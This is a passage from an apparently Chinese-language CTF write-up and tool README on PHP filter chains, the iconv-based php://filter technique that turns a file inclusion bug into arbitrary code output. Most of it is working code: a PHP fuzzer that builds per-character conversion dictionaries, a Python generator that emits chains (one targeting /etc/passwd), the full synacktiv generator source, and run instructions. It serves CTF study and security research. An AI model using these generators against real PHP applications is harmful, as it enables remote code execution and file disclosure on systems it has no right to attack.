$iconv_list = ['437','500','500V1','850','851'.....];// iconv -l生成，太长了所以省略，你也可以在这里定义你想用到的编码集
$filter_list = [
   'string.rot13',// seem no use
    'convert.iconv.*',
];

print_r($filter_list);

$prev_str = ""; # 存储上一个成功的字符链
// $news = ""; #好像没意义x
// $found_count = 0; #好像没意义x
$op_all = ""; #一般是res中的链子当作种子

$op_all_max = 2000; #链的最大长度
$last_op = "";# 上一个拼接的链子
$init_value = file_get_contents($input);
$max_c_len = strlen($init_value) * 5;

if(!is_dir('./res')){
    mkdir('./res');
}

if(!file_exists("./res/C")){
   file_put_contents('./res/C','convert.iconv.UTF8.CSISO2022KR'); #是所有链子的开始，是变异的基础，也是忘不掉的那个人
}

function getseeds($dir){ //获取文件夹中的所有文件名
    $handler = opendir($dir);  
    while (($filename = readdir($handler)) !== false) 
    {
        if ($filename !== "." && $filename !== "..") 
        {  
            $files[] = $filename ;  
        } 
    }  
    closedir($handler);  
    return $files;
}
function getRandomSeedFromDir($dir){ //因为这段代码冗余部分太多所以简化成函数了方便理解
    $files = getseeds($dir);
    $r_t = rand(1,999999) % sizeof($files);
    $seed = file_get_contents($dir.'/'.$files[$r_t]);
    echo "[mutating from exist dic] ".$files[$r_t].": ".$seed."\n";
    return $seed;
}

while(1){ //这个死循环是fuzz的核心，通过不断的和陌生人(随机数对应的编码串)相识，孜孜不倦的寻找着属于她自己的爱情......啧，多么枯燥且无味（x。
    $tmp_str = "";
    
    //$rand = rand(1,999999);
    $op = '';
    // if($last_op == $filter_list[0]){
        $rand_2 = rand(1,999999);
        $rand_3 = rand(1,999999);

        $icon1 = $iconv_list[$rand_2 % count($iconv_list)];

        $icon2 = $iconv_list[$rand_3 % count($iconv_list)];
        $op = str_replace('*',$icon1.'.'.$icon2,$filter_list[1]); //随机拼接，就像每天会遇到无数人一样（
    // } else {
    //     if($rand % 6 > 1){
    //         $rand_2 = rand(1,999999);
    //         $rand_3 = rand(1,999999);
    //         $icon1 = $iconv_list[$rand_2 % count($iconv_list)];
    //         $icon2 = $iconv_list[$rand_3 % count($iconv_list)];
    //         $op = str_replace('*',$icon1.'.'.$icon2,$filter_list[1]);
    //     }
    //     else{
    //         $op =  $filter_list[0];
    //     }
    // }
    $tmp_str = file_get_contents('php://filter/'.$op_all.(($op_all == "")?'':'|').$op.'|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource='.$input); //将随机拼接好的字符规则进行利用读取并存储在$tmp_str中

    # print("Try fuzz "."php://filter/".$op_all.(($op_all == "")?'':'|').$op.'|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource='.$input."\n"); //添加了对应的输出文本x

    if(!$tmp_str){ //如果$tmp_str不存在（拼接之后不能生成）就跳过
        continue;
    }
    if($tmp_str === $prev_str){
        continue; //如果和上一次结果一样就跳过x
    }
    if(strlen($op_all)>$op_all_max){ //如果长度超过最大设定长度就置空
        $last_op = "";
        if(rand(1,999999)% 5 > 2){
            $op_all = "";
            continue;
        }

        /*
            获取res文件夹中存在的字典作为基础种子进行再拼接
        */ 
        // $r_t = rand(1,999999);
        // $files = getseeds('./res/');
        // $r_t = $r_t % sizeof($files);
        // $seed = file_get_contents('./res/'.$files[$r_t]);
        // $op_all = $seed;
        $op_all = $op_all = getRandomSeedFromDir('./res/');
        # echo "[mutating from exist dic] ".$files[$r_t].": ".$seed."\n";
        continue;
    }
    if(strlen($tmp_str) > $max_c_len){
        $last_op = "";
        if(rand(1,999999)% 5 > 2){
            $op_all = "";
            continue;
        }

        // $r_t = rand(1,999999);
        // $files = getseeds('./res/');
        // $r_t = $r_t % sizeof($files);
        // $seed = file_get_contents('./res/'.$files[$r_t]);
        // $op_all = $seed;
        $op_all = $op_all = getRandomSeedFromDir('./res/');
        # echo "[mutating from exist dic] ".$files[$r_t].": ".$seed."\n";
        continue;
    }
    $r = strstr($tmp_str,"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",true);
    if($r === false){
        # print("Oh $r is non-compliance ! skip now! \n");
        continue;
    }
    preg_match_all("/([a-zA-Z0-9])/",$r, $res);
    if(sizeof($res[0])===strlen($r) && sizeof($res[0])==1 ){

        //$ttt = quoted_printable_encode($tmp_str);
            // echo "[!!] Magic:\n ------------------------------------------\n " . $tmp_str . "\n";

            if(file_exists("./res/".$r)){ //即使爱情已经存在，但她依然想最求更好的未来
                $size = strlen(file_get_contents("./res/".$r));
                if($size>strlen($op_all.(($op_all == "")?'':'|').$op)){//所以当她遇上更好的，会毅然的离开(指匹配到更优更短的串)
                    file_put_contents("./res/" . $r,  $op_all.(($op_all == "")?'':'|').$op);
                    print("Got Superior (of shorter length):$r ".$op_all.(($op_all == "")?'':'|').$op."\n");
                }
            }
            else{//空虚的内心似乎得到了眷顾，这是第一次她遇见的爱情，她欣然接受(指如果不存在则会直接创建)
                print("Got $r ".$op_all.(($op_all == "")?'':'|').$op."\n");
                file_put_contents("./res/" . $r, $op_all.(($op_all == "")?'':'|').$op);
            }
            //否则她还是会一如既往的，向爱情献上忠诚。
            $last_op = "";
            if(rand(1,999999)% 5 > 2){
                $op_all = "";
                continue;
            }

            // $r_t = rand(1,999999);
            // $files = getseeds('./res/');
            // $r_t = $r_t % sizeof($files);
            // $seed = file_get_contents('./res/'.$files[$r_t]);
            $op_all = $op_all = getRandomSeedFromDir('./res/');
            # echo "[mutating from exist dic] ".$files[$r_t].": ".$seed."\n";

            continue;
    }
    
    if($tmp_str === $init_value){
        $last_op = "";
        if(rand(1,999999)% 5 > 2){
            $op_all = "";
            continue;
        }
        // $r_t = rand(1,999999);
        // $files = getseeds('./res/');
        // $r_t = $r_t % sizeof($files);
        // $seed = file_get_contents('./res/'.$files[$r_t]);
        $op_all = $op_all = getRandomSeedFromDir('./res/');
        # echo "[mutating from exist dic] ".$files[$r_t].": ".$seed."\n";
        continue;
    }
    else{
        $last_op = $op;
        $prev_str = $tmp_str;
        $op_all .= (($op_all == "")?'':'|').$op;

    }

}
?>
```

下面的test.py是链的生成程序，当你提供payload的base64字符串形式时，他会寻找每个字符hexcode对应的编码进行payload生成。

```python
file_to_use = "/etc/passwd"

#在这里放入你要生成的payload的base64形式：
base64_payload = "YWFh"

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += open('./res/'+(str(hex(ord(c)))).replace("0x","")).read() + "|" # 这里是使用对应字符的hexcode来寻找对应编码，你也可以采用下面的方式，因为fuzz生成器最后生成的结果是按字符名存储并没有hex编码
        # filters += open('./res/'+c).read() + "|"
        print("use "+ c + ":" +open('./res/'+c).read())
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"

with open('test.php','w') as f:
    f.write('<?php echo file_get_contents("'+final_payload+'");?>')
print(final_payload)
```

单独说一下，`convert.iconv.UTF8.UTF7`的作用是为了防止中途出现的base64补位的等号导致解释器失效或者报错，所以用它将等号转换为其他字符(base64合法字符)

### [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) @synacktiv

```python
#!/usr/bin/env python3
import argparse
import base64
import re

# - Useful infos -
# https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters
# https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
# https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d

# No need to guess a valid filename anymore
file_to_use = "php://temp"

conversions = "dic.array"#太长了省略一下x

def generate_filter_chain(chain, debug_base64 = False):

    encoded_chain = chain
    # generate some garbage base64
    filters = "convert.iconv.UTF8.CSISO2022KR|"
    filters += "convert.base64-encode|"
    # make sure to get rid of any equal signs in both the string we just generated and the rest of the file
    filters += "convert.iconv.UTF8.UTF7|"


    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        # don't add the decode while debugging chains
        filters += "convert.base64-decode"

    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload

def main():

    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="PHP filter chain generator.")

    parser.add_argument("--chain", help="Content you want to generate. (you will maybe need to pad with spaces for your payload to work)", required=False)
    parser.add_argument("--rawbase64", help="The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.", required=False)
    args = parser.parse_args()
    if args.chain is not None:
        chain = args.chain.encode('utf-8')
        base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
        chain = generate_filter_chain(base64_value)
        print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
        print(chain)
    if args.rawbase64 is not None:
        rawbase64 = args.rawbase64.replace("=", "")
        match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
        if (match):
            chain = generate_filter_chain(rawbase64, True)
            print(chain)
        else:
            print ("[-] Base64 string required.")
            exit(1)

if __name__ == "__main__":
    main()
```

其实核心部分就这几行：

```python
    for c in encoded_chain[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"
    if not debug_base64:
        # don't add the decode while debugging chains
        filters += "convert.base64-decode"

    final_payload = f"php://filter/{filters}/resource={file_to_use}"
    return final_payload
```

和test.py其实是一样的，所以不多赘述x，不过相比起来这个更好理解~

## [filterChainFuzzerAndGenerator](https://github.com/ProbiusOfficial/filterChainFuzzerAndGenerator) （自己改了一份优化版本x

一个基于php和python的Filter链的fuzz和生成程序。

可能使用的场景:

- 无文件RCE
- CTF中的Web
- CTF中的MISC
- ......（更多可能？）

### About

你可以在下面这篇文档中了解原理和更多细节

- [【idekCTF 2022】Paywall — filter链构造和扩展](https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH)

此外，感谢下面的项目提供的思路

- https://github.com/loknop https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
- https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
- https://github.com/synacktiv/php_filter_chain_generator

项目目录各个文件的作用如下：

- Fuzzer.php 用于Fuzz filter链需要的字典
  - iconv_list.php Fuzz中字符集文件，可以按照场景自定义对应编码集
  - init Fuzzer包含用文件，基本无需改动
- [Generator.py](http://generator.py/) 用于生成任意payload的Filter链
- [aview.py](http://aview.py/) 输出.res 文件夹中字典一览
- get_dic.py 将.res文件夹中的单字符文件转换为自定义的dictionary.py字典
- [dictionary.py](http://dictionary.py/) 单字符字典，可以自定义，默认使用get_dic.py生成

### Usage

#### Fuzz

Fuzz依靠Fuzzer.php实现

在iconv_list.php中定义你fuzz需要的字符集

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110380.png)

根据对应环境选择对应的字符集合：

```bash
iconv -l
```

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110566.png)

在Fuzzer.php中设置好参数：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110182.png)

使用下面命令即可开始Fuzz：

```bash
php Fuzzer.php
```

#### Generator

Filter链的生成依靠Generator.py实现。

目前提供两种模式：

- 使用.res文件夹中原有的hexcode编码字母的链子生成
- 使用dictionary.py中的字典生成

如果你要使用第一种模式，项目下载时就附带好了对应hexcode的字典，只需要在文件开头设置参数即可：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110437.png)

当然您也可以根据项目原理自己生成。

如果您使用第二种模式，项目也准备了一份Fuzz好的单字母字典在dictionary.py中：

![img](https://nssctf.wdf.ink//img/WDTJ/202302072110005.png)

您也可以根据自己的需求Fuzz，流程大致如下：

- 设定好需要的字符集
- 运行Fuzzer.php
- 使用get_dic.py程序从.res中提取跑好的字典

当然您如果熟悉原理，也可以用您想要的方法，[自行修改字典文件dictionary.py](http://xn--dictionary-0m4p56gm6g105bj84az9at523am9xa.py/)。

当一切准备就绪，直接使用下面命令：

```bash
python Generator.py
```

即可。